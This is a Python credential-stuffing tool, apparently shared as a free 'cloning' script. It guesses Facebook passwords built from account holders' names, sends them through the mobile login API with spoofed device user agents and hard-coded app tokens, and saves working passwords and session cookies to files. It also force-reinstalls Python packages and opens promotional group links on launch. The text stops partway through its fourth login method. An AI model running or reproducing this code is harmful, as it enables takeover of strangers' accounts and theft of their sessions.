# Coded BY JUTT
import os
try:
    import requests
except ModuleNotFoundError:
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
import random,time,sys,requests,uuid,json,base64,re,zlib,shutil,platform,subprocess,tempfile,string
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup
print('Join WHATSAAP GROUP')
os.system('xdg-open https://chat.whatsapp.com/G2tYt2lGK5oKju3eizA1Sk')

oks = []
cps = []
plist = []
methods = []
speed = []
twf = []
loop = 0

def UBI():
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    android_version=str(random.randrange(6,13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice([" M Bot 54", "M Bot 60", "M1", "M3", "M3s", "M5 Lite", "M6 Note", "Magic", "Maimang 5", "Mate 10 Lite Dual SIM", "Mate 20 X (China)", "Mate 8", "MB526", "Medias X", "MI 2", "MI 3W", "Mi 4 LTE", "MI 4i", "MI 5", "MI 5X", "Mi A1", "Mi Max", "Mi Max 2", "Mi Mix 2", "Milestone", "Miracle", "Moment (Sprint)", "Monza", "Motion Plus", "Moto C", "Moto E2 (4G LTE)", "Moto E3 Power", "Moto E4", "Moto E4 Plus", "Moto E5", "Moto E5 Plus", "Moto G", "Moto G 2nd Gen", "Moto G Play", "Moto G3", "Moto G3 Turbo Edition", "Moto G4", "Moto G5 Plus", "Moto G5s", "Moto G5s Plus", "Moto G6", "Moto X", "Moto X 2nd Gen (AT&T)", "Moto Z", "Multipad 2 Ultra Duo 8.0 3G", "MultiPhone 3350 Duo", "MultiPhone 4044 Duo", "MultiPhone 5504 DUO", "Multiphone 7600 Duo", "MX2", "MX380", "MX5","13 Pro","Black Shark","Black Shark 2","Black Shark 3","Black Shark 3S","Black Shark 4","Black Shark 4 Pro","Black Shark 5","Black Shark 5 Pro","Black Shark Helo","Civi","Civi 2","Hongmi","Hongmi 1S","Hongmi 2","Hongmi 2 3G","Hongmi 2 4G","Hongmi 4G","Hongmi Note 1TD","Mi Box 4","Mi Cancro","Mi CC 9","Mi CC 9 Pro","Mi CC 9e","Mi CC9","Mi Laser Projector 150","Mi Max","Mi Max 2","Mi Max 3","Mi MAX2","Mi Max3","Mi Mix","Mi Mix 2","Mi Mix 2S","Mi Mix 3","Mi Mix 3 5G","Mi Mix 4","Mi Mix Fold","Mi Note 10","Mi Note 10 Lite","Mi Note 10 Pro","Mi Note 11","Mi Note 2","Mi Note 3","Mi Note 8","Mi Note LTE","Mi Note Pro","Mi Note10","Mi Note5","Mi One","Mi One C1","Mi One Plus","Mi Pad","Mi Pad 2","Mi Pad 3","Mi Pad 4","Mi Pad 4 Plus","Mi Pad 5","Mi Pad 5 Pro","Mi Pad 5 Pro 5G","Mi Pad4","Mi Pad5","Mi Play","Mi XL","Mi5","MiTV 4A","MiTV 4A Pro","MiTV 4C","MiTV 4I","MiTV 4S","MiTV 4X","MiTV P1","MiTV Q1","MiTV Stick","MiTV Stick 4K","Mix Fold 2","MT6765 G Series","Note 12 Pro","Pad 6 Pro","Pocophone F1","Qin 1s+","Qin 2","Qin 2 Pro","Redmi 11","Redmi 12","Redmi 2","Redmi 3","Redmi 4","Redmi 5","Redmi 6","Redmi 7","Redmi 8","Redmi 9","Redmi A1","Redmi A2","Redmi A3","Redmi K30","Redmi K40","Redmi K50","Redmi K60","Redmi note","Redmi Note 1","Redmi Note 10Redmi Note 11","Redmi Note 12","Redmi Note 12T","Redmi Note 13","Redmi Note 15 Pro","Redmi Note 2","Redmi Note 3","Redmi Note 4","Redmi Note 5","Redmi Note 5 Pro","Redmi Note 6","Redmi Note 7","Redmi Note 7 Pro","Redmi Note 8 Pro","Redmi Note 8T","Redmi Note 9","Redmi Note 9 5G","Redmi Note 9 Pro","Redmi Note 9 Pro 5G","Redmi Note 9 Pro Max","Redmi Note 9S","Redmi Note 9T","Redmi Note 9T 5G","Redmi Note Prime","Redmi Note10","Redmi Note10T","Redmi Note7","Redmi Note8","Redmi Note8T","Redmi Note9","Redmi Pad","Redmi Pro","Redmi S2","Redmi X","Redmi Y1","Redmi Y1 Lite","Redmi Y2","Redmi Y3","Redmi 2", "Redmi 3", "Redmi 3S", "Redmi 4", "Redmi 4A", "Redmi 4X", "Redmi 5", "Redmi 5 Plus", "Redmi 5A", "Redmi 6", "Redmi Note", "Redmi Note 3", "Redmi Note 4", "Redmi Note 4X", "Redmi Note 5", "Redmi Note 5 Pro", "Redmi Note 5A", "Redmi Note 5A Prime", "Redmi S2", "Redmi Y1", "Redmi Y1 Lite", "Redmi Y2", "Rex 60", "Rex 80", "Rhyme", "RM-560", "Ruby","SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6.","SM-G920F","NRD90M", "SM-T535","LRX22G", "SM-T231","KOT49H", "SM-J320F","LMY47V", "GT-I9190","KOT49H", "GT-N7100","KOT49H", "SM-T561","KTU84P", "GT-N7100","KOT49H", "GT-I9500","LRX22C", "SM-J320F","LMY47V", "SM-G930F","NRD90M", "SM-J320F","LMY47V", "SM-J510FN","NMF26X", "GT-P5100","IML74K", "SM-J320F","LMY47V", "GT-N8000","JZO54K", "SM-T531","LRX22G", "SPH-L720","KOT49H", "GT-I9500","JDQ39", "SM-G935F","NRD90M", "SM-T561","KTU84P", "SM-T531","KOT49H", "SM-J320FN","LMY47V", "SM-A500F","MMB29M", "SM-A500FU","MMB29M", "SM-A500F","MMB29M", "SM-T311","KOT49H", "SM-T531","LRX22G", "SM-J320F","LMY47V", "SM-J320FN","LMY47V", "SM-J320F","LMY47V", "GT-P5210","KOT49H", "SM-T230","KOT49H", "GT-I9192","KOT49H", "SM-T235","KOT4", "GT-N7100","KOT49H", "SM-A500F","LRX22G", "SM-A500F","MMB29M"])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    fbcr = random.choice(["Zong","Telenor","Jazz","Ufone","Warid","null","Marshmallow","Telekom China","Grameenphone","IND airtel","Namaste","Ncell","Smart cell","TELCEL","Fiber","Telecom","Sprint","banglalink","Verizon","AT&amp","TRUE-H","robi","Vodafone","MTN-CG","fido","MOVO AFRICA","UFONE-PAKTel","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Satcom","Docomo","Rakuten","IIJmio","Orange","AT&T","T-Mobile","Telefonica","EE","Orange","Three"])
    local = random.choice(["en_US","en_GB","en_PK","pt_BR","in_NP","np_NP","it_IT","ru_RU","en_ES","ja_JP","ex_MX","en_CU","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_AF","sv_SE","hr_HR"]) 
    ua1 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Redmi Note 8T MIUI/{str(build)}{str(numbr)}) [FBAN/Orca-Android;FBAV/{str(application_version)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/'+'{density=2.75,width=1080,height=2130};'+'FB_FW/1;] '+'FBBK/1'                                                   
    ua2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; ASUS_X00RD Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1352};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/asus;FBBD/asus;FBPN/{str(fbs)};FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua3 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-A720F Build/{str(build)}{str(numbr)}) [FBAN/Orca-Android;FBAV/{str(application_version)};FBPN/com.facebook.orca;'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};'+'FB_FW/1;]'                 
    ua4 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-G973U Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2024};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'                 
    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/{str(local)};FBRV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua7 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; CPH1909 Build/{str(build)}{str(numbr)}) [FBAN/Orca-Android;FBAV/{str(application_version)};FBPN/com.facebook.orca;'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=1424,height=720};'+'FB_FW/1;] '+'FBBK/1'                                 
    ua8 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; GT-I9505 Build/{str(build)}{str(numbr)}) [FBAN/Orca-Android;FBAV/{str(application_version)};FBPN/{str(application_version_code)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR//{str(fbcr)};FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};'+'FB_FW/1;]'                                                   
    ua9 = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto e5 plus Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBBV/{str(application_version_code)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=1.7,width=720,height=1358};'+'FB_FW/1;FBRV/0;]'
    ua10 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; MMB29K Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=800};'+f'FBLC/{str(fbcr)};FBCR/{str(fbcr)};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
    ua11=f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; RMX8122 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/{str(application_version_code)};FBPN/{str(fbs)};'+f'FBLC/{str(local)};FBMF/RMX;FBBD/RMX;FBDV/RMX8122;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11])
    
print('Join FB GROUP')
os.system('xdg-open https://facebook.com/groups/832597005018178/')

logo=("""\033[1;91m
                                                   
\x1b[1;97m              ██   ██  █████  ███
\x1b[1;96m        
\x1b[1;91m      
\x1b[1;92m        
\033[1;31m        
\033[1;32m        
\x1b[1;37m
\x1b[1;93m
                                           
                                           
\x1b[1;91m------------------------------------------------------
[~] Author   : \x1b[1;93mBéd
[~] GITHUB   : \x1b[1;37mKamalbadda
[~] Tool     : \033[1;32mFree
[~] FACEBOOK  :Kamal Béd
[~] Version  : \x1b[1;91m7.9
\x1b[1;93m------------------------------------------------------""")
def linex():
	print('\x1b[1;96m------------------------------------------------------')

def clear():
        os.system('clear')
        print(logo)

def menu():
    os.system('clear')
    print(logo)
    print('[1] File Cloning')
    print('[2] RANDOM Cloning')
    print('[3] JOIN WHATSAAP')
    linex()
    lomda = input('\033[1;37mChoose Option : ')
    if lomda in ['1']:
        clear()
        print('PUT FILE EXAMPLE :  /sdcard/filename.txt')
        linex()
        file = input('Enter File Name\033[1;37m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print('FILE NOT FOUND ')
            time.sleep(2)
            menu()
        clear()
        print('ALL METHODS ARE WORKING SO DONT IB ME FOR WHAT METHOD I USE')
        linex()
        print('[1] METHOD 1')
        print('[2] METHOD 2 [LUSH]')
        print('[3] METHOD 3')
        print('[4] METHOD 4')
        linex()
        mthd=input('CHOOSE : ')
        linex()
        clear()
        plist = []
        try:
            ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT ? '))
        except:
            ps_limit =1
        linex()
        clear()
        print('\033[1;37m EXAMPLE : first last,firtslast')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'PUT PASSWORD {i+1}: '))
        linex()
        clear()
        with loda(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
            print("\033[1;37m CRACKING STARTED...\033[1;37m")
            linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(ffb1,ids,names,passlist)
                elif mthd in ['2','02']:
                    crack_submit.submit(ffb2,ids,names,passlist)
                elif mthd in ['3','03']:
                    crack_submit.submit(ffb3,ids,names,passlist)
                elif mthd in ['4','04']:
                	crack_submit.submit(ffb4,ids,names,passlist)
        print('\033[1;37m')
        linex()
        print(' THE PROCESS HAS COMPLETED')
        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        linex()
        input(' PRESS ENTER TO BACK ')
        os.system('python Jutt_enc.py')
    elif lomda in ['2']:
    	print('coming soon');menu()
    elif lomda in ['3']:
        os.system('xdg-open https://chat.whatsapp.com/G2tYt2lGK5oKju3eizA1Sk')
    elif lomda in ['4']:
    	os.system('xdg-open https://facebook.com/groups/832597005018178/')    
    else:
        menu()
def ffb1(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [JUTT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = "[FBAN/FB4A;FBAV/87.0.0.33.70;FBBV/27972898;FBDM/{density=3.0,width=1128,height=1794};FBLC/en_BD;FBRV/74307385;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A225M;FBSV/13;FBOP/19;FBCA/arm64-v8a:null;]"
                        head = {'User-Agent': UBI(),
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/JUTT-XD-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/JUTT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;34m[JUTT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;31m [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
def ffb2(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [JUTT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua =random.choice(['[FBAN/FB4A;FBAV/297.0.0.66.47;FBBV/11979687;FBDM/{density=2.8,width=1084,height=1611};FBLC/en_BD;FBRV/55001358;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A907F;FBSV/9;FBOP/19;FBCA/arm64-v8a:null;]','[FBAN/FB4A;FBAV/270.0.0.54.94;FBBV/39493694;FBDM/{density=2.0,width=1082,height=1766};FBLC/en_BD;FBRV/51317302;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FN;FBSV/12;FBOP/19;FBCA/arm64-v8a:null;]','[FBAN/FB4A;FBAV/168.0.0.96.54;FBBV/62128611;FBDM/{density=2.5,width=1247,height=1727};FBLC/en_BD;FBRV/68626590;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J700T;FBSV/10;FBOP/19;FBCA/arm64-v8a:null;]','[FBAN/FB4A;FBAV/45.0.0.19.50;FBBV/17572065;FBDM/{density=3.5,width=826,height=1738};FBLC/en_BD;FBRV/67692635;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205F;FBSV/9;FBOP/19;FBCA/arm64-v8a:null;]','[FBAN/PAAA;FBAV/50.0.0.12.305;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FB_FW/2;FBSN/Android;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-N910V;FBSV/5.0.1;]','[FBAN/FB4A;FBAV/118.0.0.22.79;FBBV/54394206;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBRV/54394206;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGLS992;FBSV/7.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/26.0.0.22.16;FBBV/6590638;FBDM/{density=1.5,width=791,height=480};FBLC/en_US;FBCR/SmarTone HK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C1905;FBSV/4.1.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/315.0.0.47.113;FBPN/com.facebook.katana;FBLC/en_US;FBBV/285966838;FBCR/Android;FBMF/Genymotion;FBBD/Android;FBDV/Xiaomi Redmi Note 7;FBSV/9;FBCA/x86:null;FBDM/{density=2.625,width=1080,height=2214};FB_FW/1;FBRV/287051585;]','[FBAN/Orca-Android;FBAV/212.1.0.13.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/151534286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]'])
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        head = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/JUTT-XD-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/JUTT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;34m[JUTT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;31m [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
def ffb3(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [JUTT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua = "[FBAN/FB4A;FBAV/302.0.0.72.46;FBBV/44758880;FBDM/{density=2.0,width=888,height=1544};FBLC/en_BD;FBRV/52962227;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935U;FBSV/12;FBOP/19;FBCA/arm64-v8a:null;]"
                        head = {'User-Agent': UBI(),
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'graph.facebook.com',
                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        data = {'adid':str(uuid.uuid4()),
                                'format':'json',
                                'device_id':str(uuid.uuid4()),
                                'email':ids,'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                'cpl':'true',
                                'try_num':'1',
                                'family_device_id':str(uuid.uuid4()),
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'currently_logged_in_userid':'0',
                                'locale': 'en_SV','client_country_code': 'SV',
                                'fb_api_req_friendly_name':'authenticate',
                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
                                'access_token':accees_token}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JUTT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/JUTT-XD-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/JUTT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r \033[1;34m[JUTT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\r\x1b[1;31m [JUTT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JUTT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                time.sleep(20)
def ffb4(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [JUTT-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
